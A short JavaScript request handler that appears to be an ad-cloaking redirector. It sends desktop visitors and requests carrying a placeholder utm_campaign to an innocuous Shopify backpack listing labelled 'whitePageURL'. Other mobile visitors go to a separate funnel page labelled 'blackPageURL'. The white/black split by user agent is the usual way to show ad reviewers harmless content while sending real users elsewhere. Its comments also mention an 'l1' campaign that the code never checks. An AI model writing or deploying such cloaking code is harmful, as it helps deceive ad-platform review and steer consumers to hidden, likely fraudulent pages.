export default function handler(req, res) {
    // URLs to redirect
    const whitePageURL = "https://thebagshop-1804.myshopify.com/products/50l-large-capacity-man-army-tactical-backpacks-military-assault-bags-outdoor-3p-edc-molle-pack-for-trekking-camping-hunting-bag";
    const blackPageURL = "https://suqiqwopzxkasuewq.myfunnelish.com/imbassd-1735826861886254";
  
    // Parse the UTM parameters from the request URL
    const queryParams = new URLSearchParams(req.url.split('?')[1]);
    const utmCampaign = queryParams.get('utm_campaign');
  
    // Get the User-Agent from the request headers
    const userAgent = req.headers['user-agent'] || '';
    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
  
    // Redirection logic
    if (utmCampaign === '__AID_NAME__') {
      // UTM campaign 'l1' takes priority for both desktop and mobile
      res.writeHead(302, { Location: whitePageURL });
    } else if (isMobileDevice) {
      // Mobile devices without 'l1' campaign
      res.writeHead(302, { Location: blackPageURL });
    } else {
      // Desktop devices without 'l1' campaign
      res.writeHead(302, { Location: whitePageURL });
    }
  
    res.end();
  }
